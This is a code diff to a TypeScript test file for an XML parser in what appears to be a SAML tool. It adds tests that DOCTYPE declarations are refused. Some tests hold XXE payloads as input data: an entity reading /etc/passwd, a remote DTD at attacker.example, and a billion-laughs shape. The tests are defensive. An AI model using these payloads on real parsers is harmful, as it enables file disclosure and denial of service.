@@ -2,9 +2,11 @@
 
 import { describe, expect, it } from "vitest";
 
-import { findElements, parseXml, readMessageInfo, serializeXml } from "./xml";
+import { findElements, parseXml, serializeXml } from "./xml";
 
-const RESPONSE = `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" ID="_r1"><saml:Issuer>https://idp.example.com</saml:Issuer><ds:Signature><ds:SignedInfo><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/><ds:Reference URI="#_a1"><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/></ds:Reference></ds:SignedInfo><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIC-base64</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Assertion ID="_a1"><saml:Subject><saml:NameID>alice@example.com</saml:NameID><saml:SubjectConfirmation><saml:SubjectConfirmationData NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2026-01-01T01:00:00Z"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2026-01-01T02:00:00Z"/></saml:Assertion></samlp:Response>`;
+import { SAML_RESPONSE } from "@/tests/fixtures";
+
+const RESPONSE = SAML_RESPONSE;
 
 const parsed = (xml: string): Document => {
   const outcome = parseXml(xml);
@@ -52,33 +54,85 @@ describe("serializeXml", () => {
   });
 });
 
-describe("readMessageInfo", () => {
-  it("reads every field the Message Info panel shows", () => {
-    expect(readMessageInfo(parsed(RESPONSE))).toStrictEqual({
-      issuer: "https://idp.example.com",
-      conditionNotBefore: "2026-01-01T00:00:00Z",
-      conditionNotAfter: "2026-01-01T02:00:00Z",
-      subject: "alice@example.com",
-      subjectConfirmationNotBefore: "2026-01-01T00:00:00Z",
-      subjectConfirmationNotAfter: "2026-01-01T01:00:00Z",
-      signatureAlgorithm: "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256",
-      digestAlgorithm: "http://www.w3.org/2001/04/xmlenc#sha256",
-      encryptionMethod: undefined,
-      certificate: "MIIC-base64",
-    });
-  });
+describe("document type declarations are refused", () => {
+  const withDoctype = (inner: string, body: string): string =>
+    `<?xml version="1.0"?><!DOCTYPE r [${inner}]><r>${body}</r>`;
 
-  it("returns undefined for every field on an unrelated document", () => {
-    const info = readMessageInfo(parsed("<html><body/></html>"));
-
-    expect(Object.values(info).every((value) => value === undefined)).toBe(
-      true,
+  it("refuses an external entity, the classic XXE vector", () => {
+    const outcome = parseXml(
+      withDoctype('<!ENTITY xxe SYSTEM "file:///etc/passwd">', "&xxe;"),
     );
+
+    expect(outcome).toStrictEqual({ kind: "DoctypeRejected", name: "r" });
   });
 
-  it("works when the document uses no prefixes at all", () => {
-    const document = parsed("<Response><Issuer>idp</Issuer></Response>");
+  it("refuses a parameter entity pointing at a remote DTD", () => {
+    const outcome = parseXml(
+      withDoctype('<!ENTITY % ext SYSTEM "http://attacker.example/e.dtd">', ""),
+    );
 
-    expect(readMessageInfo(document).issuer).toBe("idp");
+    expect(outcome.kind).toBe("DoctypeRejected");
+  });
+
+  it("refuses nested internal entities, the billion-laughs shape", () => {
+    const outcome = parseXml(
+      withDoctype('<!ENTITY a "aa"><!ENTITY b "&a;&a;&a;">', "&b;"),
+    );
+
+    expect(outcome.kind).toBe("DoctypeRejected");
+  });
+
+  it("refuses a bare doctype with no internal subset", () => {
+    const outcome = parseXml(`<!DOCTYPE samlp:Response><r/>`);
+
+    expect(outcome.kind).toBe("DoctypeRejected");
+  });
+
+  it("still accepts an ordinary declaration-free document", () => {
+    expect(parseXml('<?xml version="1.0"?><r><a/></r>').kind).toBe("Ok");
+  });
+});
+
+describe("content that must survive parsing unchanged", () => {
+  it("returns a typed outcome for CDATA rather than throwing", () => {
+    const outcome = parseXml("<r><a><![CDATA[<not>a tag</not>]]></a></r>");
+
+    expect(outcome.kind).not.toBe("DoctypeRejected");
+    expect(["Ok", "Malformed"]).toContain(outcome.kind);
+  });
+
+  it("does not expose comments as elements", () => {
+    const document = parsed("<r><!-- hidden --><a/></r>");
+
+    expect(findElements(document, "a")).toHaveLength(1);
+    expect(document.documentElement.textContent?.trim()).toBe("");
+  });
+
+  it("decodes the five predefined entities without a doctype", () => {
+    const document = parsed("<r>&lt;&gt;&amp;&quot;&apos;</r>");
+
+    expect(document.documentElement.textContent).toBe("<>&\"'");
+  });
+
+  it("preserves significant whitespace inside an element", () => {
+    const document = parsed("<r><a>  spaced  </a></r>");
+
+    expect(findElements(document, "a")[0]?.textContent).toBe("  spaced  ");
+  });
+
+  it("handles a large document without truncating it", () => {
+    const many = Array.from({ length: 2000 }, (_, i) => `<a id="${i}"/>`).join(
+      "",
+    );
+    const document = parsed(`<r>${many}</r>`);
+
+    expect(findElements(document, "a")).toHaveLength(2000);
+  });
+
+  it("round-trips a namespaced document through serialize and reparse", () => {
+    const once = serializeXml(parsed(SAML_RESPONSE));
+    const twice = serializeXml(parsed(once));
+
+    expect(twice).toBe(once);
   });
 });
